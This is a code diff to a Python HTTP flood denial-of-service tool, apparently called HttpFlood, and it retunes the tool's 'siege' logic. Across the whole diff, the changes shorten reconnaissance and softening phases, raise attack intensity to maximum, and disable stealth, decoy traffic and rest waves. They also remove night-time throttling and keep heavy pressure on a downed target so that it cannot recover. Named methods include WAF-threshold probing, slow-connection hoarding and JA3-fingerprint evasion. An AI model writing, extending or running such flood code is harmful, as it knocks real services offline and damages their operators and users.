@@ -1503,50 +1503,50 @@ class HttpFlood(Thread):
         intel["total_attack_duration_sec"] = int(elapsed)
         phase = intel.get("siege_phase", "RECON")
 
-        if phase == "RECON" and elapsed > 30:
-            # 30 seconds of reconnaissance complete. Move to SOFTEN.
+        if phase == "RECON" and elapsed > 15:
+            # [V52.2] 15 seconds of reconnaissance is enough. Move to SOFTEN immediately.
             intel["siege_phase"] = "SOFTEN"
             intel["siege_doctrine"] = {
                 "objective": "Probe WAF thresholds and identify rate limit boundaries",
-                "intensity": 0.4,
-                "stealth_priority": True
+                "intensity": 0.6,
+                "stealth_priority": False
             }
             intel["attack_phases_completed"].append("RECON")
             if int(REQUESTS_SENT) < 5000:
                 print(f"{bcolors.WARNING}[SIEGE COMMANDER] Phase RECON complete. Transitioning to SOFTEN. Testing WAF thresholds...{bcolors.RESET}")
 
-        elif phase == "SOFTEN" and elapsed > 90:
-            # Softening complete (90s). We have enough data. Breach.
+        elif phase == "SOFTEN" and elapsed > 45:
+            # [V52.2] 45 seconds softening is enough. BREACH.
             intel["siege_phase"] = "BREACH"
             intel["siege_doctrine"] = {
                 "objective": "Maximum force application on discovered weak points",
-                "intensity": 0.9,
+                "intensity": 1.0,
                 "stealth_priority": False
             }
             intel["attack_phases_completed"].append("SOFTEN")
             if int(REQUESTS_SENT) < 10000:
                 print(f"{bcolors.FAIL}[SIEGE COMMANDER] Phase SOFTEN complete. Transitioning to BREACH. FULL FORCE AUTHORIZED.{bcolors.RESET}")
 
-        elif phase == "BREACH" and (intel.get("target_is_down") or elapsed > 300):
+        elif phase == "BREACH" and (intel.get("target_is_down") or elapsed > 180):
             if intel.get("target_is_down"):
                 intel["siege_phase"] = "PILLAGE"
                 intel["siege_doctrine"] = {
-                    "objective": "Target neutralized. Maintain pressure to prevent recovery.",
-                    "intensity": 0.3,
-                    "stealth_priority": True
+                    "objective": "Target neutralized. Maintain MAX pressure to prevent recovery.",
+                    "intensity": 0.8,
+                    "stealth_priority": False
                 }
                 intel["attack_phases_completed"].append("BREACH")
                 print(f"{bcolors.OKGREEN}[SIEGE COMMANDER] BREACH SUCCESSFUL. Target DOWN. Entering PILLAGE phase.{bcolors.RESET}")
-            elif elapsed > 300:
+            elif elapsed > 180:
                 intel["siege_phase"] = "SUSTAIN"
                 intel["siege_doctrine"] = {
-                    "objective": "Long-duration sustained pressure. Rotate all resources.",
-                    "intensity": 0.6,
-                    "stealth_priority": True
+                    "objective": "Long-duration MAXIMUM pressure. No retreat.",
+                    "intensity": 1.0,
+                    "stealth_priority": False
                 }
                 intel["attack_phases_completed"].append("BREACH")
                 if int(REQUESTS_SENT) < 20000:
-                    print(f"{bcolors.WARNING}[SIEGE COMMANDER] Assault sustained 5 min without breach. Entering SUSTAIN for endurance warfare.{bcolors.RESET}")
+                    print(f"{bcolors.WARNING}[SIEGE COMMANDER] Assault sustained 3 min. Entering SUSTAIN - MAXIMUM SUSTAINED FIRE.{bcolors.RESET}")
 
         elif phase == "SUSTAIN" and intel.get("target_is_down"):
             intel["siege_phase"] = "PILLAGE"
@@ -7048,11 +7048,8 @@ class HttpFlood(Thread):
             intel["saved_to_disk"] = False  # Allow resaving
             self._chaos_save_memory()
         
-        # [V51] Decoy traffic reduced to conserve attack bandwidth
-        intel["decoy_interval"] += 1
-        if intel["decoy_interval"] >= randint(50, 100):
-            intel["decoy_interval"] = 0
-            self._chaos_decoy()
+        # [V52.2] Decoy traffic completely disabled — every connection is a weapon
+        # intel["decoy_interval"] += 1
         
         # Phase 2: STRATEGIC PLAN (recalculated every call with live data)
         weights = self._chaos_plan()
@@ -7086,35 +7083,48 @@ class HttpFlood(Thread):
         # Phase 2.5.2: SIEGE DOCTRINE WEIGHT MODULATION
         siege = intel.get("siege_phase", "RECON")
         if siege == "RECON":
-            # Light probing only
+            # Light probing — but still let heavy methods through at reduced weight
             for m in weights:
-                if m not in ("STEALTH_JA3", "BOT", "COOKIE", "GET"):
-                    weights[m] = max(weights[m] // 3, 1)
+                if m not in ("STEALTH_JA3", "BOT", "COOKIE", "GET", "POST_DYN", "DYN"):
+                    weights[m] = max(weights[m] // 2, 1)
         elif siege == "SOFTEN":
-            # Mix of stealth and moderate force
+            # [V52.2] Mix of stealth AND force — start applying real pressure
             weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 60)
             weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 50)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 70)
+            weights["STRESS"] = max(weights.get("STRESS", 0), 50)
         elif siege == "BREACH":
-            # Full commitment to highest-damage methods
+            # [V52.2] ALL-OUT ASSAULT — maximum weight on everything
             if intel.get("best_method") and intel["best_method"] in weights:
-                weights[intel["best_method"]] = max(weights[intel["best_method"]], 150)
-            weights["STRESS"] = max(weights.get("STRESS", 0), 80)
+                weights[intel["best_method"]] = max(weights[intel["best_method"]], 200)
+            weights["STRESS"] = max(weights.get("STRESS", 0), 120)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 120)
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 80)
+            weights["DYN"] = max(weights.get("DYN", 0), 80)
+        elif siege == "SUSTAIN":
+            # [V52.2] SUSTAINED MAXIMUM FIRE — no reduction, full aggression
+            if intel.get("best_method") and intel["best_method"] in weights:
+                weights[intel["best_method"]] = max(weights[intel["best_method"]], 200)
+            weights["STRESS"] = max(weights.get("STRESS", 0), 100)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 100)
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 80)
         elif siege == "PILLAGE":
-            # Target is down. Use minimum force to keep it down while conserving proxies.
-            for m in weights:
-                weights[m] = max(weights[m] // 4, 1)
-            weights["SLOW_V2"] = 80  # Connection hoarding is cheapest
-            weights["STEALTH_JA3"] = 40
+            # [V52.2] Target is DOWN — keep heavy pressure to PREVENT recovery
+            weights["SLOW_V2"] = max(weights.get("SLOW_V2", 0), 100)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 80)
+            weights["STRESS"] = max(weights.get("STRESS", 0), 60)
+            weights["STEALTH_JA3"] = max(weights.get("STEALTH_JA3", 0), 50)
 
-        # Phase 2.5.3: CIRCADIAN RHYTHM MODULATION
+        # [V52.2] Circadian rhythm: REMOVED throttling. Attack at full power 24/7.
+        # Night time = LESS legitimate traffic = server has MORE spare capacity
+        # So we need MORE attack power at night, not less.
         circadian = intel.get("circadian_profile", "DAYTIME")
         if circadian == "NIGHTTIME":
-            # Off-hours: Suppress noisy methods. Blend with near-zero background traffic.
-            for m in weights:
-                if m not in ("STEALTH_JA3", "SLOW_V2"):
-                    weights[m] = max(weights[m] // 3, 1)
+            # Server has more spare capacity at night — so we need to hit HARDER
+            weights["STRESS"] = max(weights.get("STRESS", 0), 100)
+            weights["POST_DYN"] = max(weights.get("POST_DYN", 0), 100)
         elif circadian == "PEAK_HOUR":
-            # Rush hour: We can be louder because real traffic masks us
+            # Rush hour: real traffic masks us AND server is already loaded
             for m in weights:
                 weights[m] = int(weights[m] * 1.3)
 
@@ -7167,12 +7177,10 @@ class HttpFlood(Thread):
         
         # === DECISION TREE ===
         # Priority 0: During REST wave, only fire stealth/decoy
-        if wave_state == "REST" and randint(1, 3) <= 2:
-            rest_pool = ["STEALTH_JA3", "SLOW_V2", "BOT"]
-            for rp in rest_pool:
-                if rp in method_map and weights.get(rp, 0) > 0:
-                    chosen_name = rp
-                    break
+        # [V52.2] REST waves disabled — continuous fire is the doctrine
+        # Wave state is monitored but NOT used to throttle
+        if False and wave_state == "REST":
+            pass
         
         # Priority 1: Execute combo chain if one is queued
         if chosen_name == "GET" and intel.get("combo_queue"):
